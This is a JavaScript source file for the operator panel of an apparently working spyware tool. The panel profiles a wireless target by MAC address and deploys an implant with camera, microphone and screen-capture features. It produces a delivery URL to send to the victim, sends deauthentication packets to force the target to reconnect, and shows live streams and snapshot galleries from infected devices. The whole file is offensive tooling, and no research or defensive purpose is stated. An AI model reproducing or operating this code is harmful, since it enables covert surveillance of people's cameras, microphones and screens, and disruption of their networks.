const socket = io();
const mac = window.location.pathname.split('/').pop().replace(/-/g, ':');

// UI Elements
const macDisplay = document.getElementById('mac-display');
const infoVendor = document.getElementById('info-vendor');
const infoType = document.getElementById('info-type');
const infoSignal = document.getElementById('info-signal');
const infoStatus = document.getElementById('info-status');
const deployBtn = document.getElementById('deploy-btn');
const deliveryBox = document.getElementById('delivery-box');
const targetUrlInput = document.getElementById('target-url');
const videoGrid = document.getElementById('video-grid');
const streamStatus = document.getElementById('stream-status');
const snapshotGallery = document.getElementById('snapshot-gallery');
const deauthBtn = document.getElementById('deauth-btn');
const ssidList = document.getElementById('ssid-list');
const infoAp = document.getElementById('info-ap');

macDisplay.textContent = mac;

async function fetchDeviceInfo() {
    try {
        const response = await fetch(`/api/device/${mac.replace(/:/g, '-')}`);
        const data = await response.json();

        infoVendor.textContent = data.device.vendor;

        let typeText = data.device.type;
        if (data.device.os_guess && data.device.os_guess !== "Unknown") {
            typeText += ` (${data.device.os_guess})`;
        }
        infoType.textContent = typeText;

        const infoIp = document.getElementById('info-ip');
        if (infoIp) infoIp.textContent = data.device.ip || "Unknown";

        infoSignal.textContent = `${data.device.signal} dBm`;
        infoStatus.textContent = data.device.implant_status;

        // Update SSID History
        if (data.device.ssids && data.device.ssids.length > 0) {
            ssidList.innerHTML = data.device.ssids.map(s => `<span class="status-pill">${s}</span>`).join('');
        } else {
            ssidList.innerHTML = '<span class="status-pill">None detected</span>';
        }

        // Update Associated AP
        if (infoAp) {
            infoAp.textContent = data.device.associated_ap || 'Unknown';
        }

        // --- Render Open Ports ---
        const portsList = document.getElementById('ports-list');
        if (portsList) {
            if (data.device.open_ports && data.device.open_ports.length > 0) {
                portsList.innerHTML = data.device.open_ports.map(p => `
                    <tr>
                        <td><span class="cam-status open">${p.port}</span></td>
                        <td style="text-transform: uppercase;">${p.protocol}</td>
                        <td>${p.name} <span style="opacity: 0.6; font-size: 0.8em; margin-left: 5px;">${p.product} ${p.version}</span></td>
                    </tr>
                `).join('');
            } else if (data.device.ip) {
                portsList.innerHTML = '<tr><td colspan="3" class="status-waiting">No open ports discovered</td></tr>';
            } else {
                portsList.innerHTML = '<tr><td colspan="3" class="status-waiting">Awaiting IP resolution...</td></tr>';
            }
        }

        if (data.implant) {
            showDeliveryBox(data.implant.delivery_url);
        }

        if (data.status && data.status.status === 'active') {
            handleCheckin(data.status);
        }
    } catch (err) {
        console.error('Failed to fetch device info:', err);
    }
}

deployBtn.onclick = async () => {
    const features = [];
    if (document.getElementById('feat-cam-front').checked) features.push('camera_front');
    if (document.getElementById('feat-cam-back').checked) features.push('camera_back');
    if (document.getElementById('feat-mic').checked) features.push('microphone');
    if (document.getElementById('feat-screen').checked) features.push('screen');

    try {
        const response = await fetch('/api/deploy', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mac, features })
        });
        const result = await response.json();
        showDeliveryBox(result.delivery_url);
        infoStatus.textContent = 'deployed';
    } catch (err) {
        alert('Deployment failed');
    }
};

deauthBtn.onclick = async () => {
    if (!confirm('This will send deauthentication packets to force the device to reconnect. Proceed?')) return;

    deauthBtn.disabled = true;
    deauthBtn.textContent = 'Sending Packets...';

    try {
        const response = await fetch('/api/deauth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mac: mac })
        });
        const result = await response.json();
        if (result.success) {
            alert('Deauth packets sent successfully.');
        } else {
            alert('Deauth failed: No associated AP known for this target.');
        }
    } catch (err) {
        alert('API error during deauth.');
    } finally {
        deauthBtn.disabled = false;
        deauthBtn.textContent = 'Force Reconnect (Deauth)';
    }
};

function showDeliveryBox(url) {
    deliveryBox.style.display = 'block';
    targetUrlInput.value = url;
}

function copyUrl() {
    targetUrlInput.select();
    document.execCommand('copy');
    alert('URL copied to clipboard');
}

function handleCheckin(data) {
    streamStatus.style.display = 'none';
    videoGrid.innerHTML = '';

    data.streams.forEach(stream => {
        const isCam = stream.startsWith('cam') || stream === 'screen';
        const slot = document.createElement('div');
        slot.className = 'video-slot';
        slot.innerHTML = `
            <div class="slot-label">${stream.toUpperCase()}</div>
            ${isCam ? `<video id="video-${stream}" autoplay muted playsinline></video>` : `<div class="audio-wave">MIC ACTIVE</div>`}
            ${isCam ? `<button class="btn-snapshot" onclick="takeSnapshot('${stream}')">📸</button>` : ''}
        `;
        videoGrid.appendChild(slot);

        if (isCam) startPlayback(stream, data.id);
    });

    if (data.streams.length === 0) {
        let errorList = data.errors ? `<ul style="margin-top:0.5rem; text-align:left; font-size:0.75rem;">${data.errors.map(e => `<li>${e}</li>`).join('')}</ul>` : 'No errors reported.';
        streamStatus.innerHTML = `
            <div style="font-weight:bold; color:var(--accent);">Hardware Access Required</div>
            <div style="margin-top:0.5rem; color:var(--text-secondary); font-size:0.85rem;">The target device has not granted permissions or lacks compatible hardware.</div>
            <div style="margin-top:1rem; color:var(--text-secondary);">Hardware Diagnostics:</div>
            ${errorList}
        `;
        streamStatus.style.display = 'block';
        streamStatus.className = 'status-warning';
    }
}

async function takeSnapshot(stream) {
    console.log('Requesting snapshot for:', stream);
    try {
        await fetch('/api/command', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ type: 'snapshot', stream: stream })
        });
    } catch (err) {
        console.error('Failed to send snapshot command:', err);
    }
}

function addPhotoToGallery(data) {
    const item = document.createElement('div');
    item.className = 'snapshot-item';
    // Path on server is /captures/id/filename
    const filename = data.path.split('/').pop();
    const id = data.path.split('/').slice(-2, -1)[0];
    const url = `/api/captures/${id}/${filename}`;

    item.innerHTML = `
        <a href="${url}" target="_blank">
            <img src="${url}" alt="Snapshot">
        </a>
        <div class="snapshot-tag">${data.stream.toUpperCase()} - ${new Date().toLocaleTimeString()}</div>
    `;
    snapshotGallery.prepend(item);
}

function startPlayback(stream, iid) {
    console.log(`Starting playback for ${stream} on ${iid}`);
}

socket.on('implant_active', (data) => {
    if (data.mac === mac) {
        handleCheckin(data.data);
    }
});

socket.on('new_photo', (data) => {
    if (data.mac === mac) {
        addPhotoToGallery(data);
    }
});

fetchDeviceInfo();
